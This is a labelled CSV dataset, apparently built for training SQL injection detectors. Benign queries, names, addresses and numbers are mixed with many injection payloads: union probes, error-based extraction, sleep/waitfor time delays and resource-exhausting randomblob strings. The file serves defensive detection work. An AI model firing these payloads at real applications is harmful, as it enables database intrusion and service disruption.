Query,Label
SELECT * FROM greater WHERE Price NOT BETWEEN 10 AND 20,0
"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT TOP 3 * FROM rise SELECT * FROM substance 3SELECT * FROM cutting,0
7.38537E+15,0
"1' where 1893  =  1893 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
moyes,0
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc",1
SELECT COUNT ( DISTINCT century )  FROM mouth,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367827 ) ,0
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,1
SELECT Count ( * )  AS shells,0
giovannina,0
"1"" where 1920  =  1920 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
DELETE FROM page,0
algemes,0
SELECT * FROM ocean 3,0
"  SELECT   COALESCE ( NULL, NULL, NULL, 'W3Schools.com', NULL, 'Example.com' ) ;",0
88253687l,0
2.77767E+15,0
# from wapiti,1
5335,0
"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
SELECT draw FROM action UNION SELECT detail FROM printed ORDER BY popular,0
SELECT * FROM dinner WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM magnet WHERE four LIKE '%fat%',0
SELECT * FROM pay ORDER BY upper,0
"   SELECT COUNT ( body ) , drop FROM doll BY stopped",0
SELECT time FROM flies,0
almirall pahisa,0
DELETE FROM favorite WHERE tobacco = 'standard',0
SELECT COUNT ( pick ) FROM guard,0
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz",1
"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",1
SELECT congress FROM church UNION ALL SELECT apple FROM warn ORDER BY name,0
"1"" where 3318  =  3318",1
SELECT AVG ( Price ) FROM drink,0
sau nobrega,0
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20,0
"1%""  )   waitfor delay '0:0:5' and   (  ""%""  =  """,1
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""kvpy""  =  ""kvpy",1
SELECT pilot ( s )  FROM feed SELECT fireplace ( s ) ,0
SELECT leaf ( s )  FROM to UNION,0
"   SELECT Employees.canal, COUNT ( Orders.properID )  AS meetFROM    ( OrdersINNER JOIN height ON Orders.factorID  =  Employees.freeID ) ",0
osada,0
ojeda fita,0
"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""owzc"" like ""owzc",1
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
napolen,0
hermanos barral 61,0
roca,0
"calle licurgo, 39",0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1
FROM  ( SELECT DISTINCT map FROM run ) ,0
2719,0
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1
FROM  ( SELECT DISTINCT pitch FROM exciting ) ,0
"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",1
5.38547E+15,0
rinaldi albiol,0
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
nao,0
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1
SELECT COUNT ( favorite )  FROM thirty,0
SELECT bat ( s )  FROM although FULL OUTER JOIN,0
nada,0
SELECT * FROM below WHERE tonight = 'sick'  AND  ( year = 'labor' OR she = 'too' ) ,0
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",1
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",1
4259,0
5a09la,0
SELECT thread ( s )  FROM whom UNION ALL,0
decacque,0
SELECT * FROM supply ORDER BY pocket,0
28530,0
SELECT * FROM iron WHERE supply = 'least'  AND  ( advice = 'lot' OR party = 'potatoes' ) ,0
SELECT * FROM society WHERE train  BETWEEN 10 AND 20,0
"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",1
SELECT * FROM single WHERE been BETWEEN average09/01/1996movie AND work15/31/1996radio,0
SELECT * FROM caught WHERE balloon BETWEEN '1996-07-01' AND '1996-07-31',0
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
"c/ costa verde, 100 4c",0
matie,0
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
5.88977E+15,0
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1
"SELECT * FROM useful WHERE took BETWEEN ""egg"" AND    ""likely""",0
dante@opticaweb.mobi,0
45518730m,0
WHERE ProductID  =  ALL  ( SELECT ProductID FROM OrderDetails WHERE Quantity  =  10 ) ;,0
"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --",1
34481916v,0
"-9382'  )   union all select 4774,4774,4774,4774--",1
SELECT TOP 3 * FROM among WHERE cook = 'someone' SELECT * FROM chance,0
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1
SELECT * FROM differ WHERE blanket = 'bet',0
teruel,0
"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND    ""dress""",0
carmelo,0
"1%'   )    )     )   union all select null,null,null,null#",1
arimany aguila,0
22122,0
1'   )    )    as qswu where 6377  =  6377,1
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",1
terl6z,0
balcells parets,0
select sleep  (  5  )   and    (    (     (  5552  =  5552,1
1 where 6173  =  6173,1
SELECT * FROM standard WHERE    NOT nature = 'anyway',0
SELECT * FROM protection WHERE gold = 'involved'  AND City = 'poem',0
1  )   where 9708  =  9708,1
select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,1
"-9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514",1
"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"  SELECT adult AS blue, having AS [chose]  FROM off",0
SELECT rising ( s FROM turn RIGHT JOIN,0
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,0
"   SELECT married, dug, zeroFROM work WHERE dollar  IS NOT NULL",0
SELECT TOP 3 * FROM somehow,0
 (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1
6.03007E+15,0
FROM  ( SELECT DISTINCT sale FROM search ) ,0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",1
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
"   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop",0
"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
SELECT slipped ( s )  FROM dawn LEFT JOIN,0
SELECT daily ( s )  FROM shorter LEFT JOIN,0
SELECT Count ( * )  AS small,0
"1%""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""%""  =  """,1
SELECT   LOCALTIMESTAMP (  )  + 1;,0
78695182s,0
"alcalde baeza medina, s/n,",0
85,0
yahed,0
4.38114E+15,0
1riot_0115a,0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""urqg""  =  ""urqg",1
"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
712,0
end and    (    (     (  3673  =  3673,1
maclaren,0
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  3872  =  3872",1
"   SELECT atom, edge+ ', ' + worried+ ' ' + grabbed+ ', ' + program AS supper  FROM troops",0
"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",1
"SELECT LOCATE ( ""3"", ""W3Schools.com"" )  AS MatchPosition;",0
"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",1
SELECT CURDATE (  ) ;,0
1' and 4374  =  2305,1
1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,1
SELECT COUNT ( activityID ) FROM ready,0
SELECT * FROM sit ORDER BY game,0
"  SELECT foodID AS ID, those AS distant FROM deer",0
9.8986E+14,0
belva,0
" SELECT column_name ( s )  FROM greatly,compare",0
SELECT TOP 3 * FROM equipment WHERE stream = 'guide' SELECT * FROM particular,0
"calle blas infante 52, 6-h",0
"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1
"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT DISTINCT command FROM gradually,0
SELECT AVG ( flower ) FROM five SELECT SUM ( direction ) ,0
SELECT month FROM pride UNION SELECT safety FROM push ORDER BY managed,0
SELECT behavior ( s )  FROM enjoy FULL OUTER JOIN,0
" SELECT * FROM gold ORDER BY bicycle, nation",0
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1
"  SELECT thank AS dried, studied AS [refused]  FROM land",0
87,0
SELECT AVG ( future )  FROM desk  SELECT SUM ( began ) ,0
50332,0
SELECT * FROM stick WHERE cloud BETWEEN key09/01/1996column AND certain15/31/1996vote,0
1 or sleep  (  5  ) ,1
ariel,0
8.77345E+15,0
guasch xifr,0
SELECT * FROM parent WHERE NOT could = 'nation'  AND NOT prevent = 'thank',0
SELECT SUM ( Quantity )  AS TotalItemsOrdered FROM OrderDetails;,0
1'+  (  select qsmo where 3172  =  3172,1
SELECT * FROM myself,0
1  )   where 9307  =  9307,1
roco daira,0
cedric,0
31153,0
SELECT * FROM sail WHERE have NOT BETWEEN 'people' AND 'form',0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1
5.18985E+14,0
SELECT * FROM buffalo WHERE copy IN  ( SELECT maybe FROM division ) ,0
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0
SELECT * FROM source FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",1
SELECT TOP 50 PERCENT * FROM arm,0
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1
 UPDATE known SET weight = 'slabs'WHERE front = 'image',0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
winningt,0
"1""  )   as vqkz where 8536  =  8536",1
"  SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  ",0
SELECT AVG ( hunter )  FROM bee  SELECT SUM ( general ) ,0
taspatch,0
1'  )   where 5871  =  5871,1
"1""  )   order by 1--",1
morales de toro,0
47651101t,0
voglis@hiperxxx.au,0
mairozio,0
karkotsk,0
SELECT * FROM if  WHERE cage = military,0
1  )   where 3979  =  3979 rlike sleep  (  5  )  --,1
t1iesti70,0
1%' and 4595  =  4595#,1
1.61637E+15,0
massaguer molin,0
"-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch",1
SELECT * FROM small WHERE silly BETWEEN 'term' AND 'information',0
SELECT * FROM citizen WHERE game NOT LIKE '[task]%',0
"   SELECT Employees.fence, COUNT ( Orders.volumeID )  AS chamberFROM    ( OrdersINNER JOIN sister ON Orders.layersID  =  Employees.cloudID ) ",0
50835477a,0
